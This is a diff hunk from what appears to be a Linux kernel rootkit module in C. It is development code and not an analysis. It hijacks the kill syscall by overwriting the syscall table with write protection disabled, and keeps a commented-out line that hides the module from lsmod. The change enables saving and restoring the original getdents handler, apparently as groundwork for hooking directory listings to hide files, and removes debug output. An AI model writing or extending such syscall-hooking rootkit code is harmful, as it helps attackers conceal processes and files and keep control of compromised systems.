@@ -138,24 +138,22 @@ static int init(void) { //initial function, sets up syscall hijacking
 //    list_del(&myself->list); //remove from places such as lsmod
     //have to disable previous line otherwise you can't unload module without rebooting
     original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
-    //original_getdents = (void *)syscall_table[__NR_getdents];
+    original_getdents = (void *)syscall_table[__NR_getdents];
     //original_getdents64 = (void *)syscall_table[__NR_getdents64];
     GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
     //syscall_table[__NR_getdents] = new_getdents;
     syscall_table[__NR_kill] = new_kill;
     //syscall_table[__NR_getdents64] = new_getdents64;
     GPF_ENABLE;
-    printk("INIT OK\n");
 	return 0;
 }
 
 void cleanup_module(void) {
     GPF_DISABLE;
     syscall_table[__NR_kill] = original_kill; //corrects the hijacking on unload
-    //syscall_table[__NR_getdents] = original_getdents;
+    syscall_table[__NR_getdents] = original_getdents;
     //syscall_table[__NR_getdents64] = original_getdents64;
     GPF_ENABLE;
-    printk("UNLOAD OK\n");
     return;
 }
 
